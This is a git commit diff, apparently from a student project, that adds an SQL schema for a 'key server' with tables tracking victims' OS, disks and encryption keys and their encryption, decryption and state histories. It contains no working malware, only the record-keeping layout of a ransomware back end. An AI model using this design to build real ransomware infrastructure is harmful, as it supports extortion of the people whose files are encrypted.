744912ddb5ea6c5ce72e03c1806e9ec839b6229f
T-Mees <t.mees@student.helmo.be>
2024-02-06 15:45:55 +0100

    Creation tables BD (vides)

--- serveur_cles/script/victims_schema.sql
+++ serveur_cles/script/victims_schema.sql
@@ -3,3 +3,36 @@ drop table if exists encrypted;
 drop table if exists states;
 drop table if exists victims;
 
+CREATE TABLE victims(
+    id_victim INTEGER PRIMARY KEY ,
+    os VARCHAR ,
+    hash VARCHAR ,
+    disks VARCHAR ,
+    key VARCHAR
+);
+
+CREATE TABLE decrypted(
+    id_decrypted INTEGER PRIMARY KEY ,
+    id_victim INTEGER ,
+    datetime timestamp ,
+    nb_files INTEGER ,
+    FOREIGN KEY(id_victim) REFERENCES victims(id_victim)
+);
+
+CREATE TABLE states(
+    id_states INTEGER PRIMARY KEY ,
+    id_victim INTEGER ,
+    datetime timestamp ,
+    state VARCHAR ,
+    FOREIGN KEY(id_victim) REFERENCES victims(id_victim)
+);
+
+CREATE TABLE encrypted(
+    id_encrypted INTEGER PRIMARY KEY ,
+    id_victim INTEGER ,
+    datetime timestamp ,
+    nb_files INTEGER ,
+    FOREIGN KEY(id_victim) REFERENCES victims(id_victim)
+);
+
+
